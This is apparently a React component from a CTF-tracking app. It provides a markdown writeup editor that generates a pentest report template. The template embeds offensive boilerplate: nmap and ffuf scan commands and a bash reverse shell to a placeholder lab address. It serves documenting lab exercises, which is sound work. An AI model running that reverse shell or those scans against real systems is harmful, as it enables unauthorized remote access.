import React, { useState, useEffect, useMemo, useRef, useDeferredValue } from 'react';
import { useParams } from 'react-router-dom';
import { 
  FileText, 
  Download, 
  Copy, 
  Check, 
  RotateCcw, 
  Sparkles, 
  ExternalLink,
  Code,
  Eye,
  BookOpen,
  FolderGit2,
  Printer,
  X,
  Search,
  Plus,
  Globe
} from 'lucide-react';
import { useCtfStore, BRAND_THEMES } from '../../store/useCtfStore';
import { useShallow } from 'zustand/react/shallow';
import { Machine } from '../../types';
import { playCyberSound, interpolateCommand, safeCopyToClipboard } from '../../utils/helpers';
import { downloadWriteupHtml } from '../../utils/writeupHtmlExporter';
import { sanitizeFilename } from '../../utils/workspaceStorage';
import { PentestReportModal } from './PentestReportModal';
import { CPTS_NOTES, CptsNoteEntry, searchCptsNotes, getRecommendedNotesForMachine } from '../../utils/obsidianManualUtils';
import { PlatformIcon } from '../common/PlatformBadge';
import { CyberSelect, CyberSelectOption } from '../common/CyberSelect';
const renderLineWithWikilinks = (text: string, keyPrefix: string | number) => {
  if (!text.includes('[[')) return text;
  const parts = text.split(/(\[\[[^\]]+\]\])/g);
  return parts.map((part, i) => {
    if (part.startsWith('[[') && part.endsWith(']]')) {
      const raw = part.slice(2, -2);
      const [target, alias] = raw.split('|');
      return (
        <span
          key={`${keyPrefix}-wl-${i}`}
          className="inline-flex items-center gap-1 px-1.5 py-0.2 rounded bg-purple-500/15 border border-purple-500/30 text-purple-300 font-mono text-[11px] font-semibold mx-0.5"
          title={`Wikilink: ${target.trim()}`}
        >
          <BookOpen className="w-2.5 h-2.5 text-purple-400 inline" />
          {alias ? alias.trim() : target.trim()}
        </span>
      );
    }
    return part;
  });
};

const renderMarkdownPreview = (text: string) => {
  const lines = text.split('\n');
  let inFrontmatter = false;
  let frontmatterLines: string[] = [];
  let inCodeBlock = false;
  let codeBlockLang = '';
  let codeBlockLines: string[] = [];

  const elements: React.ReactNode[] = [];

  lines.forEach((line, idx) => {
    // Frontmatter detection
    if (idx === 0 && line.trim() === '---') {
      inFrontmatter = true;
      return;
    }
    if (inFrontmatter) {
      if (line.trim() === '---') {
        inFrontmatter = false;
        elements.push(
          <div key={`fm-${idx}`} className="mb-4 p-3 rounded-lg bg-cyber-bg border border-cyber-cyan/30 text-[11px] font-mono text-cyber-cyan/90 space-y-0.5">
            <div className="text-[10px] uppercase font-bold text-cyber-muted mb-1 flex items-center gap-1">
              <FolderGit2 className="w-3 h-3 text-cyber-cyan" /> OBSIDIAN / GITBOOK YAML FRONTMATTER
            </div>
            {frontmatterLines.map((fl, fIdx) => (
              <div key={fIdx}>{fl}</div>
            ))}
          </div>
        );
        return;
      }
      frontmatterLines.push(line);
      return;
    }

    // Codeblock detection
    if (line.startsWith('```')) {
      if (!inCodeBlock) {
        inCodeBlock = true;
        codeBlockLang = line.replace('```', '').trim();
        codeBlockLines = [];
      } else {
        inCodeBlock = false;
        elements.push(
          <div key={`cb-${idx}`} className="my-3 rounded-lg overflow-hidden border border-cyber-border bg-cyber-code">
            {codeBlockLang && (
              <div className="bg-cyber-bg/80 px-3 py-1 text-[10px] text-cyber-muted font-mono uppercase border-b border-cyber-border flex items-center justify-between">
                <span>{codeBlockLang}</span>
                <Code className="w-3 h-3" />
              </div>
            )}
            <pre className="p-3 text-xs text-cyber-emerald font-mono overflow-x-auto whitespace-pre-wrap">
              {codeBlockLines.join('\n')}
            </pre>
          </div>
        );
      }
      return;
    }

    if (inCodeBlock) {
      codeBlockLines.push(line);
      return;
    }

    // Headings
    if (line.startsWith('# ')) {
      elements.push(
        <h1 key={idx} className="text-xl font-bold text-slate-900 dark:text-white mt-4 mb-2 pb-1 border-b border-cyber-border">
          {renderLineWithWikilinks(line.replace('# ', ''), idx)}
        </h1>
      );
    } else if (line.startsWith('## ')) {
      elements.push(
        <h2 key={idx} className="text-base font-bold text-cyber-cyan mt-4 mb-1.5 flex items-center gap-2">
          {renderLineWithWikilinks(line.replace('## ', ''), idx)}
        </h2>
      );
    } else if (line.startsWith('### ')) {
      elements.push(
        <h3 key={idx} className="text-sm font-semibold text-cyber-text mt-3 mb-1">
          {renderLineWithWikilinks(line.replace('### ', ''), idx)}
        </h3>
      );
    } else if (line.startsWith('---')) {
      elements.push(<hr key={idx} className="my-3 border-cyber-border" />);
    } else if (line.startsWith('- ')) {
      elements.push(
        <li key={idx} className="ml-4 text-xs text-cyber-text list-disc my-0.5">
          {renderLineWithWikilinks(line.replace('- ', ''), idx)}
        </li>
      );
    } else if (line.trim() === '') {
      elements.push(<div key={idx} className="h-2" />);
    } else {
      elements.push(
        <p key={idx} className="text-xs text-cyber-text leading-relaxed font-sans">
          {renderLineWithWikilinks(line, idx)}
        </p>
      );
    }
  });

  return elements;
};

interface DeferredMarkdownPreviewPaneProps {
  content: string;
}

const DeferredMarkdownPreviewPane: React.FC<DeferredMarkdownPreviewPaneProps> = React.memo(({ content }) => {
  const deferredContent = useDeferredValue(content);
  const isStale = deferredContent !== content;

  const renderedPreview = useMemo(() => {
    return renderMarkdownPreview(deferredContent);
  }, [deferredContent]);

  return (
    <div
      className={`flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg transition-opacity duration-150 ${isStale ? 'opacity-85' : 'opacity-100'}`}
      style={{ contain: 'content' }}
    >
      <div className="flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs">
        <span className="font-bold text-slate-900 dark:text-white flex items-center gap-2">
          <Eye className="w-4 h-4 text-cyber-emerald" /> LIVE RENDERED PREVIEW
        </span>
        <div className="flex items-center gap-2">
          {isStale && (
            <span className="text-[9px] font-mono px-1.5 py-0.2 rounded bg-cyber-cyan/15 text-cyber-cyan border border-cyber-cyan/30 animate-pulse">
              SYNCING AST...
            </span>
          )}
          <span className="text-[10px] text-cyber-emerald font-semibold flex items-center gap-1">
            <BookOpen className="w-3 h-3" /> OBSIDIAN PREVIEW
          </span>
        </div>
      </div>

      <div className="flex-1 p-5 overflow-y-auto max-h-[calc(100vh-280px)] bg-cyber-card/40">
        {renderedPreview}
      </div>
    </div>
  );
});

export const WriteupStudio: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const { machines, writeupMachineId, setWriteupMachineId, updateMachine, soundEnabled, globalVars, appBrand } = useCtfStore(
    useShallow((s) => ({
      machines: s.machines,
      writeupMachineId: s.writeupMachineId,
      setWriteupMachineId: s.setWriteupMachineId,
      updateMachine: s.updateMachine,
      soundEnabled: s.soundEnabled,
      globalVars: s.globalVars,
      appBrand: s.appBrand,
    }))
  );

  useEffect(() => {
    if (id && machines.some((m) => m.id === id)) {
      setWriteupMachineId(id);
    }
  }, [id, machines, setWriteupMachineId]);

  const selectedMachine = machines.find((m) => m.id === writeupMachineId) || machines[0];

  const [copied, setCopied] = useState(false);
  const [reportModalOpen, setReportModalOpen] = useState(false);
  const [editorContent, setEditorContent] = useState('');
  const [cptsDrawerOpen, setCptsDrawerOpen] = useState(false);
  const [cptsSearch, setCptsSearch] = useState('');
  const [debouncedSearch, setDebouncedSearch] = useState('');
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null);

  // Debounce search query by 150ms to maintain 120 FPS
  useEffect(() => {
    const timer = setTimeout(() => {
      setDebouncedSearch(cptsSearch);
    }, 150);
    return () => clearTimeout(timer);
  }, [cptsSearch]);

  // Capped at top 20 matches as mandated by Fable Advisor
  const matchingNotes = useMemo(() => {
    if (!debouncedSearch.trim()) {
      return selectedMachine ? getRecommendedNotesForMachine(selectedMachine, 20) : CPTS_NOTES.slice(0, 20);
    }
    return searchCptsNotes(debouncedSearch, 'ALL').slice(0, 20);
  }, [debouncedSearch, selectedMachine]);

  const handleInsertNote = (note: CptsNoteEntry) => {
    if (!selectedMachine) return;
    const targetVars = { ...globalVars, targetIp: selectedMachine.ip || globalVars.targetIp };
    const cmdsFormatted = note.commands && note.commands.length > 0
      ? `\n\`\`\`bash\n# ${note.title}\n${note.commands.map(c => interpolateCommand(c, targetVars)).join('\n')}\n\`\`\`\n`
      : '';

    const snippet = `\n\n---\n\n### 📚 Field Manual: ${note.title}\n> **Category:** ${note.category} | **Difficulty:** ${note.difficulty}\n> ${note.summary || note.subCategory}\n${cmdsFormatted}`;

    const updated = editorContent + snippet;
    setEditorContent(updated);
    updateMachine(selectedMachine.id, { writeupMarkdown: updated });
    if (soundEnabled) playCyberSound('root');
  };

  // Generate standardized template with YAML frontmatter for Obsidian / GitBook
  const generateTemplate = (m: Machine): string => {
    const today = new Date().toISOString().slice(0, 10);
    const tagsList = m.tags.length > 0 ? m.tags.join(', ') : 'ctf, pentest, writeup';

    return `---
title: "${m.platform || 'CTF'} Writeup - ${m.name}"
target_ip: "${m.ip}"
platform: "${m.platform}"
os: "${m.os}"
difficulty: "${m.difficulty}"
status: "${m.status}"
user_flag: "${m.userFlag || 'FLAG{...}'}"
root_flag: "${m.rootFlag || 'FLAG{...}'}"
time_spent: "${Math.round(m.timeSpentSeconds / 60)} minutes"
tags: [${tagsList}]
date: "${today}"
author: "ZeroBox Operator"
---

# ${m.name} — Writeup & Penetration Testing Report
**Target IP:** \`${m.ip}\` | **OS:** ${m.os} | **Platform:** ${m.platform} | **Difficulty:** ${m.difficulty}

---

## 1. Executive Summary & Difficulty Breakdown
- **Initial Foothold Vector:** [Brief summary of initial vulnerability, e.g. SQL Injection / LFI / Deserialization]
- **Privilege Escalation Vector:** [Brief summary of root escalation, e.g. SUID binary / Sudo misconfiguration / ADCS]
- **Perceived Rating:** ${m.difficulty} (Official) vs ${m.perceivedDifficulty || m.difficulty} (Perceived)

---

## 2. Reconnaissance & Nmap Scan Results
### TCP All-Ports Scan
\`\`\`bash
# Fast SYN and Service Version Detection
nmap -sC -sV -Pn --min-rate 2000 -oN nmap_quick.txt ${m.ip}
\`\`\`

### Discovered Services:
- **Port 22/tcp:** Open (OpenSSH 8.4p1)
- **Port 80/tcp:** Open (Apache httpd 2.4.41)
- **Port 445/tcp:** Filtered (SMB)

### Web Directory & Endpoint Fuzzing
\`\`\`bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://${m.ip}/FUZZ -ac
\`\`\`

---

## 3. Vulnerability Analysis & Foothold Exploitation
### Discovery:
[Detail the attack vector found during enumeration]

### Exploitation Proof-of-Concept:
\`\`\`bash
# Reverse Shell or Exploit Execution
bash -i >& /dev/tcp/10.10.14.X/4444 0>&1
\`\`\`

### User Flag Loot:
\`\`\`bash
cat /home/*/user.txt
# Flag: ${m.userFlag || 'FLAG{...}'}
\`\`\`

---

## 4. Privilege Escalation & Proof of Concept
### Internal Enumeration:
- Ran LinPEAS / WinPEAS automated audit.
- Identified misconfigured SUID / Sudo permissions:
\`\`\`bash
sudo -l
\`\`\`

### Root Escalation:
[Explain escalation path step by step]

### Root / System Flag:
\`\`\`bash
cat /root/root.txt
# Flag: ${m.rootFlag || 'FLAG{...}'}
\`\`\`

---

## 5. Post-Exploitation Loot & Lessons Learned
- **Key Takeaway 1:** Always inspect source comments for credential leaks.
- **Key Takeaway 2:** Validate wildcard expansions in scheduled crontabs.
- **Mitigation:** Patch vulnerable services, restrict sudoers configuration, and apply least privilege principles.
`;
  };

  // Debounce refs for fluid, 120 FPS typing in the editor
  const debounceTimerRef = useRef<any>(null);
  const pendingMachineIdRef = useRef<string | null>(null);
  const pendingContentRef = useRef<string>('');

  const flushDebouncedSave = () => {
    if (debounceTimerRef.current) {
      clearTimeout(debounceTimerRef.current);
      debounceTimerRef.current = null;
    }
    if (pendingMachineIdRef.current && pendingContentRef.current !== '') {
      updateMachine(pendingMachineIdRef.current, { writeupMarkdown: pendingContentRef.current });
      pendingMachineIdRef.current = null;
    }
  };

  // Flush debounced writeup updates on unmount
  useEffect(() => {
    return () => {
      flushDebouncedSave();
    };
  }, []);

  // Synchronize editor content with selected machine writeup
  useEffect(() => {
    flushDebouncedSave();
    if (selectedMachine) {
      if (selectedMachine.writeupMarkdown) {
        setEditorContent(selectedMachine.writeupMarkdown);
      } else {
        const tmpl = generateTemplate(selectedMachine);
        setEditorContent(tmpl);
        updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      }
    }
  }, [selectedMachine?.id]);

  const handleEditorChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    const val = e.target.value;
    setEditorContent(val);
    if (selectedMachine) {
      pendingMachineIdRef.current = selectedMachine.id;
      pendingContentRef.current = val;
      if (debounceTimerRef.current) {
        clearTimeout(debounceTimerRef.current);
      }
      debounceTimerRef.current = setTimeout(() => {
        if (selectedMachine) {
          updateMachine(selectedMachine.id, { writeupMarkdown: val });
          pendingMachineIdRef.current = null;
        }
      }, 400);
    }
  };

  const handleResetToTemplate = () => {
    if (!selectedMachine) return;
    if (confirm(`Reset writeup for ${selectedMachine.name} to standard template?`)) {
      const tmpl = generateTemplate(selectedMachine);
      setEditorContent(tmpl);
      updateMachine(selectedMachine.id, { writeupMarkdown: tmpl });
      if (soundEnabled) playCyberSound('root');
    }
  };

  const handleCopyMarkdown = () => {
    navigator.clipboard.writeText(editorContent);
    setCopied(true);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDownloadMarkdown = () => {
    if (!selectedMachine) return;
    const blob = new Blob([editorContent], { type: 'text/markdown;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    const rawSlug = (selectedMachine.name || 'writeup').toLowerCase().replace(/[^a-z0-9]/g, '-');
    const safeSlug = sanitizeFilename(rawSlug, 'writeup');
    link.download = `${safeSlug}-writeup.md`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
    if (soundEnabled) playCyberSound('root');
  };

  const handleDownloadHtml = () => {
    if (!selectedMachine) return;
    const activeBrandObj = BRAND_THEMES.find((b) => b.id === appBrand) || BRAND_THEMES[0];
    downloadWriteupHtml(selectedMachine, editorContent, {
      brandName: `${activeBrandObj.namePrefix}${activeBrandObj.nameSuffix}`,
    });
    if (soundEnabled) playCyberSound('export');
  };


  return (
    <div className="space-y-4 w-full font-mono">
      {/* Studio Header Bar */}
      <div className="p-4 rounded-xl border border-cyber-border bg-cyber-card/90 shadow-md flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-lg bg-cyber-bg border border-cyber-cyan/40 flex items-center justify-center">
            <FileText className="w-5 h-5 text-cyber-cyan" />
          </div>
          <div>
            <h1 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
              EMBEDDED WRITEUP STUDIO
              <span className="text-[10px] font-semibold px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30">
                OBSIDIAN & GITBOOK READY
              </span>
            </h1>
            <p className="text-xs text-cyber-muted mt-0.5">
              Dual-pane live editor with automated pentest template generation, frontmatter, and single-click .md export.
            </p>
          </div>
        </div>

        {/* Machine Selector & Export Actions */}
        <div className="flex flex-wrap items-center gap-2.5">
          {/* Machine Dropdown */}
          <div className="flex items-center gap-1.5 bg-cyber-bg px-2.5 py-1 rounded-lg border border-cyber-border">
            <span className="text-[10px] uppercase font-bold text-cyber-muted">Target Box:</span>
            <CyberSelect
              value={selectedMachine?.id || ''}
              onChange={setWriteupMachineId}
              options={machines.map((m) => ({
                value: m.id,
                label: `${m.name} (${m.platform})`,
                icon: <PlatformIcon platform={m.platform} className="w-3.5 h-3.5" />,
                description: `${m.ip} · ${m.difficulty}`,
              }))}
              searchable
              searchPlaceholder="Search box by name, IP..."
              variant="transparent"
              size="xs"
              triggerClassName="py-0 px-1 border-none bg-transparent hover:bg-transparent max-w-[210px]"
              soundEnabled={soundEnabled}
            />
          </div>

          <button
            onClick={handleResetToTemplate}
            className="flex items-center gap-1 px-2.5 py-1.5 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-slate-900 dark:hover:text-white text-xs transition-colors"
            title="Reset to fresh pentest template"
          >
            <RotateCcw className="w-3.5 h-3.5" />
            <span className="hidden sm:inline">Reset Template</span>
          </button>

          <button
            onClick={handleCopyMarkdown}
            className="flex items-center gap-1 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-cyan text-slate-900 dark:text-white text-xs font-semibold transition-all"
          >
            {copied ? (
              <>
                <Check className="w-3.5 h-3.5 text-cyber-emerald" />
                <span className="text-cyber-emerald">Copied!</span>
              </>
            ) : (
              <>
                <Copy className="w-3.5 h-3.5" />
                <span>Copy Raw</span>
              </>
            )}
          </button>

          <button
            onClick={() => setCptsDrawerOpen(prev => !prev)}
            className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs font-bold transition-all shadow-sm ${
              cptsDrawerOpen
                ? 'bg-purple-500 text-black border-purple-400 shadow-purple-500/30'
                : 'bg-purple-950/30 border-purple-500/40 text-purple-300 hover:bg-purple-900/40 hover:text-white'
            }`}
            title="Toggle Field Manual Quick Reference Drawer"
          >
            <BookOpen className="w-3.5 h-3.5" />
            <span>Field Manual ({matchingNotes.length})</span>
          </button>

          <button
            onClick={() => setReportModalOpen(true)}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-cyan/40 hover:border-cyber-cyan text-cyber-cyan hover:bg-cyber-cyan/10 text-xs font-bold transition-all shadow-glow-cyan/20"
            title="Generate print-ready Executive Penetration Testing Report"
          >
            <Printer className="w-3.5 h-3.5" />
            <span>Executive Report</span>
          </button>

          {Boolean(selectedMachine?.officialWalkthrough) && (
            <button
              onClick={() => {
                if (!selectedMachine.officialWalkthrough) return;
                const injection = `\n\n---\n\n## 🛡️ Official Hack The Box Walkthrough & Intelligence\n${selectedMachine.officialWalkthrough}\n`;
                const updated = editorContent + injection;
                setEditorContent(updated);
                updateMachine(selectedMachine.id, { writeupMarkdown: updated });
                if (soundEnabled) playCyberSound('engage');
              }}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald/15 border border-cyber-emerald/40 hover:border-cyber-emerald text-cyber-emerald hover:bg-cyber-emerald hover:text-black text-xs font-bold transition-all shadow-sm"
              title="Append official Hack The Box Walkthrough & Intelligence to this writeup"
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>+ Official HTB Intel</span>
            </button>
          )}

          <button
            onClick={handleDownloadMarkdown}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-card border border-cyber-border hover:border-cyber-emerald text-cyber-emerald font-bold text-xs hover:bg-cyber-emerald/10 transition-all"
            title="Export raw Markdown (.md) formatted for Obsidian or GitBook"
          >
            <Download className="w-3.5 h-3.5" />
            <span>Export .md</span>
          </button>

          <button
            onClick={handleDownloadHtml}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-cyber-emerald text-black font-bold text-xs hover:bg-cyber-emerald/90 transition-all shadow-glow-emerald"
            title="Export self-contained, air-gapped HTML writeup report with 1-click Print to PDF"
          >
            <Globe className="w-3.5 h-3.5" />
            <span>Export HTML</span>
          </button>
        </div>
      </div>

      {/* Field Manual Quick Reference Drawer */}
      {cptsDrawerOpen && (
        <div className="p-4 rounded-xl border border-purple-500/40 bg-cyber-card/95 shadow-2xl space-y-3 font-mono">
          <div className="flex items-center justify-between border-b border-cyber-border pb-2.5">
            <div className="flex items-center gap-2">
              <BookOpen className="w-4 h-4 text-purple-400" />
              <span className="font-bold text-white text-xs tracking-wider">
                TACTICAL INTEL // QUICK REFERENCE & INSERT
              </span>
              <span className="text-[10px] px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono">
                {matchingNotes.length} MATCHES (MAX 20)
              </span>
            </div>

            <button
              type="button"
              onClick={() => setCptsDrawerOpen(false)}
              className="p-1 rounded text-cyber-muted hover:text-slate-900 dark:hover:text-white"
            >
              <X className="w-4 h-4" />
            </button>
          </div>

          {/* Quick Search Bar */}
          <div className="relative">
            <Search className="w-3.5 h-3.5 text-cyber-muted absolute left-3 top-2.5" />
            <input
              type="text"
              id="writeup-notes-search"
              name="writeup-notes-search"
              aria-label="Search field manual notes and commands"
              value={cptsSearch}
              onChange={(e) => setCptsSearch(e.target.value)}
              placeholder="Search field manual notes & commands (e.g. kerberoast, suid, lfi, bloodhound)..."
              className="w-full bg-cyber-bg border border-cyber-border rounded-lg pl-8 pr-3 py-1.5 text-xs text-slate-900 dark:text-white placeholder-cyber-muted focus:outline-none focus:border-purple-400"
            />
          </div>

          {/* Matching Notes Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3 max-h-72 overflow-y-auto pr-1">
            {matchingNotes.length === 0 ? (
              <div className="col-span-full p-4 text-center text-xs text-cyber-muted">
                No matching field manual notes found.
              </div>
            ) : (
              matchingNotes.map((note) => (
                <div
                  key={note.id}
                  className="p-3 rounded-lg bg-cyber-bg border border-cyber-border hover:border-purple-500/50 transition-all space-y-2 flex flex-col justify-between"
                >
                  <div className="space-y-1">
                    <div className="flex items-center justify-between gap-1">
                      <span className="font-bold text-slate-900 dark:text-white text-xs truncate" title={note.title}>
                        {note.title}
                      </span>
                      <span className="text-[9px] px-1.5 py-0.2 rounded bg-purple-500/15 text-purple-300 border border-purple-500/30 flex-shrink-0 font-mono">
                        {note.difficulty}
                      </span>
                    </div>
                    <div className="text-[10px] text-cyber-muted line-clamp-2">
                      {note.summary || note.subCategory}
                    </div>
                  </div>

                  {note.commands && note.commands.length > 0 && (
                    <div className="p-1.5 rounded bg-black/50 border border-cyber-border/70 font-mono text-[10px] text-cyber-cyan truncate">
                      {interpolateCommand(note.commands[0], { ...globalVars, targetIp: selectedMachine?.ip || globalVars.targetIp })}
                    </div>
                  )}

                  <div className="flex items-center justify-between gap-2 pt-1 border-t border-cyber-border/50">
                    <span className="text-[9px] text-cyber-muted font-mono truncate">
                      {note.category}
                    </span>
                    <button
                      type="button"
                      onClick={() => handleInsertNote(note)}
                      className="flex items-center gap-1 px-2.5 py-1 rounded bg-purple-500/20 hover:bg-purple-500 hover:text-black border border-purple-500/40 text-purple-300 text-[10px] font-bold transition-all"
                      title="Insert this note and commands into active writeup"
                    >
                      <Plus className="w-3 h-3" />
                      <span>Insert</span>
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* Dual-Pane Editor Workspace */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 items-stretch min-h-[calc(100vh-250px)]">
        
        {/* Left Pane: Raw Markdown Editor */}
        <div className="flex flex-col rounded-xl border border-cyber-border bg-cyber-card overflow-hidden shadow-lg" style={{ contain: 'content' }}>
          <div className="flex items-center justify-between border-b border-cyber-border px-4 py-2.5 bg-cyber-bg/70 text-xs">
            <span className="font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <Code className="w-4 h-4 text-cyber-cyan" /> RAW MARKDOWN (YAML & BODY)
            </span>
            <span className="text-[10px] text-cyber-muted font-mono">
              {editorContent.length} chars · {editorContent.split('\n').length} lines
            </span>
          </div>

          <textarea
            id="writeup-markdown-editor"
            name="writeup-markdown-editor"
            aria-label="Markdown report editor"
            value={editorContent}
            onChange={handleEditorChange}
            onBlur={flushDebouncedSave}
            placeholder="Write your penetration testing report or paste notes here..."
            className="flex-1 w-full p-4 bg-cyber-bg text-cyber-text font-mono text-xs focus:outline-none resize-none leading-relaxed overflow-y-auto"
            spellCheck={false}
          />
        </div>

        {/* Right Pane: Live Rendered Preview (Deferred AST tokenization) */}
        <DeferredMarkdownPreviewPane content={editorContent} />

      </div>

      {/* Executive Pentest Report Modal */}
      <PentestReportModal
        machine={selectedMachine || machines[0] || null}
        isOpen={reportModalOpen}
        onClose={() => setReportModalOpen(false)}
      />
    </div>
  );
};
